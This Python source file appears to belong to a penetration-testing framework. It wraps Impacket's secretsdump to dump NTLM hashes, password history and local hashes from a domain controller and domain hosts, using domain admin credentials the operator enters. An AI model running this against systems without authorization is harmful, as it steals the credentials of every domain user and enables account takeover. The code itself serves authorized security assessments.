import json
import sys
from common import print_text
from common.tool import Tool
from common.manual import Entry
from common.selection import Selection
from enterprise_conf import PYTHONv2_PATH, IMPACKET_PATH

class SecretsDump(Tool):

    def __init__(self, db_object, full_client_engagement_path):
        try:

            self.tool = "secretsdump (domain pwdlastset)"

            self.db_object = db_object
            self.full_client_engagement_path = full_client_engagement_path
            self.output_folder = self.full_client_engagement_path + self.tool

            Tool.__init__(self, db_object, self.output_folder, self.tool, False)

            self.targets = []
            self.commands = []
        except Exception as e:
            print_text.print_error("tool secretsdump (domain pwdlastset) except: " + str(e) + " Error on line {}".format(sys.exc_info()[-1].tb_lineno))
        return

    def __enter__(self):
        return self

    def __exit__(self, type, value, traceback):
        return self

    def manual_entry(self):
        """
        Asks for necessary manual entry if not hard set in pat_user_config.
        :return:
        """
        try:
            MANUAL_FIELDS = [['domain', 'domain', ''], ['DA username', 'username', ''],
                             ['DA password', 'password', ''], ['Domain Controller IP', 'dc', ''],
                             [' Y to use VSS or N to use DRSUAPI', 'use_vss', '']]
            required_fields = ['domain', 'username', 'password', 'dc']
            if IMPACKET_PATH == "":
                required_fields.append("impacket_path")
                MANUAL_FIELDS.append(["the full path to the impacket scripts", "impacket_path", ''])

            if len(MANUAL_FIELDS) > 0:
                with Entry("Result", MANUAL_FIELDS, required_fields) as me:
                    values = me.user_input_fields(input_text='Please enter ')

            if values['use_vss']:
                values['use_vss'] = " -use-vss"
            else:
                values['use_vss'] = ""

            if "impacket_path" not in values:
                values['impacket_path'] = IMPACKET_PATH

            # Select Scope
            scopes = self.db_object.dictionary_list("Scope", "entry")
            count_numbers = self.db_object.dictionary_list("Scope", "id")

            if len(scopes) > 0:
                if len(scopes) == 1:
                    values['scope_id'] = count_numbers[0]
                else:
                    with Selection('Select the Scope of these devices', scopes, None) as selection:
                        values['scope_id'] = str(selection.select_option(count_numbers))
                    values['location_id'] = self.db_object.grab_column_from_single_record("Scope", ["id"], [
                            values['scope_id']], "location_id")

            self.repo_entries = [{'entry': values['dc'], 'location_id': values['location_id'],
                                  'scope_id': values['scope_id'], 'id': values['scope_id']}]
            return values

        except Exception as e:
            print_text.print_error("tool secretsdump except: " + str(e) + " Error on line {}".format(sys.exc_info()[-1].tb_lineno))

    def get_targets(self, values, additiona_cmd):
        """ The only entry is

        :param scan_type: type of responder scan ex) tcp-common
        :return: list of scope_ips to scan
        """
        try:
            self.setup_already_done_checks(self.tool)

            base_command = "sudo " + PYTHONv2_PATH + " " + IMPACKET_PATH + "/examples/secretsdump.py " \
                                         "-just-dc-ntlm " + values['domain'] + "/" + \
                                         values['username'] + ":" + values['password'] + "@" + values['dc'] + \
                                         " -outputfile OUTPUT_FOLDER" + additiona_cmd + values['use_vss']

            self.targets, self.commands = self.get_targets_cmd(base_command)

        except Exception as e:
            print_text.print_error("tool secretsdump (domain pwdlastset) except: " + str(e) + " Error on line {}".format(sys.exc_info()[-1].tb_lineno))

    def domain_hashdump(self):
        """
        Function exists for the menu option to target and run the scan
        """
        try:
            self.tool = "secretsdump (domain pwdhashes)"
            self.output_folder = self.full_client_engagement_path + self.tool

            Tool.__init__(self, self.db_object, self.output_folder, self.tool, True)

            values = self.manual_entry()

            if values is not None:
                self.get_targets(values, "/hashdump.txt")
                self.run_group(self.targets, self.commands, "")

        except Exception as e:
            print_text.print_error("tool secretsdump (domain pwdhashes) except: " + str(e) + " Error on line {}".format(sys.exc_info()[-1].tb_lineno))


    def domain_pwdlastset(self):
        """
        Function exists for the menu option to target and run the scan
        """
        try:
            self.tool = "secretsdump (domain pwdlastset)"
            self.output_folder = self.full_client_engagement_path + self.tool

            Tool.__init__(self, self.db_object, self.output_folder, self.tool, True)

            values = self.manual_entry()

            if values is not None:
                self.get_targets(values, "/pwdlastset.txt -pwd-last-set -user-status")
                self.run_group(self.targets, self.commands, "")

        except Exception as e:
            print_text.print_error("tool secretsdump (domain pwdlastset) except: " + str(e) + " Error on line {}".format(sys.exc_info()[-1].tb_lineno))

    def domain_history(self):
        """
        Function exists for the menu option to target and run the scan
        """
        try:
            self.tool = "secretsdump (domain pwdhistory)"
            self.output_folder = self.full_client_engagement_path + self.tool

            Tool.__init__(self, self.db_object, self.output_folder, self.tool, True)

            values = self.manual_entry()

            if values is not None:
                self.get_targets(values, "/pwdhistory.txt -history -pwd-last-set -user-status")
                self.run_group(self.targets, self.commands, "")

        except Exception as e:
            print_text.print_error("tool secretsdump (domain pwdlastset) except: " + str(e) + " Error on line {}".format(sys.exc_info()[-1].tb_lineno))


    def local_hashdump(self):
        """
        Function exists for the menu option to target and run the scan
        """
        try:
            print_text.print_msg("Make sure you've enumated the AD using NetView first so that all the AD computers "
                                 "are listed as Engagement Devices, otherwise, this will be incomplete!")

            self.tool = "secretsdump (local_hashdump)"
            self.output_folder = self.full_client_engagement_path + self.tool

            Tool.__init__(self, self.db_object, self.output_folder, self.tool, True)

            values = self.manual_entry()

            engagement_devices = self.db_object.join_view("EngagementDevice", ["Scope.location_id"], None)
            self.repo_entries = []
            for ed in engagement_devices:
                ed['entry'] = ed['name']
                self.repo_entries.append(ed)

            if values is not None:
                self.get_targets(values, "/FORMATTED_ENTRY_local_hashes.txt")
                self.run_group(self.targets, self.commands, "")

        except Exception as e:
            print_text.print_error("tool secretsdump (local_hashdump) except: " + str(e) + " Error on line {}".format(
                sys.exc_info()[-1].tb_lineno))
